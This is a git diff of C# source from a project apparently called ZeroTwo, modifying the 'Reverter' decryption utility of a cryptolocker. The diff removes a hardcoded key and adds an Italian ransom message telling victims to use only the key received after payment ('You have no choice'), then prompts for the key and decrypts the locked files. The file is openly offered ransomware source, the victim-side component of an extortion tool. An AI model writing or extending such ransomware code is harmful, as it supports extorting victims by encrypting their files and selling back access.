@@ -7,11 +7,30 @@ namespace ZeroTwo.src {
     class Reverter {
         private const string EXT = ".02";
 
-        private static byte[] k = Encoding.ASCII.GetBytes("0202020202020202");
+        private const string UTIL_WELCOME = 
+            "La presente utility ti permette di recuperare i file cifrati dal cryptolocker ZeroTwo.\n\n" +
+            "ATTENZIONE - non modifcare i file cifrati e utilizza SOLO la chiave ricevuta a seguito del pagamento!\n\n" + 
+            "PER QUALE MOTIVO? - Utilizzando una chiave diversa verrà effettuata una decifratura che non restituirà i file originali che saranno irrimediabilmente irrecuperabili.\n" + 
+            "Modificando i file, allo stesso modo, la decifratura restituirà dei file corrotti pur utilizzando la chiave corretta.\n\n" + 
+            "COME POSSO FIDARMI? - Non hai scelta. \n\n" + 
+            "Chiave di decifratura: ";
+
+        private static byte[] k = null;
         private static byte[] s = Encoding.ASCII.GetBytes("0202020202020202");
 
         public static void Main(string[] args) {
-            Exec();
+            Console.ForegroundColor = ConsoleColor.Magenta;
+            Console.WriteLine(UTIL_WELCOME);
+            string inputKey = Console.ReadLine();
+            Console.WriteLine("\nHai inserito: " + inputKey + "\nPremi INVIO per confermare, oppure un tasto qualsiasi per annullare e uscire.");
+            ConsoleKeyInfo confirmInfo = Console.ReadKey();
+            if(confirmInfo.Key == ConsoleKey.Enter) {
+                k = Encoding.ASCII.GetBytes(inputKey);
+                Console.WriteLine("\nDecifratura in corso...");
+                Exec();
+                Console.WriteLine("\nDecifratura completata, puoi uscire premendo un tasto qualsiasi e puoi eliminare questa utility!");
+                Console.ReadKey();
+            }
         }
 
         private static void Exec() {
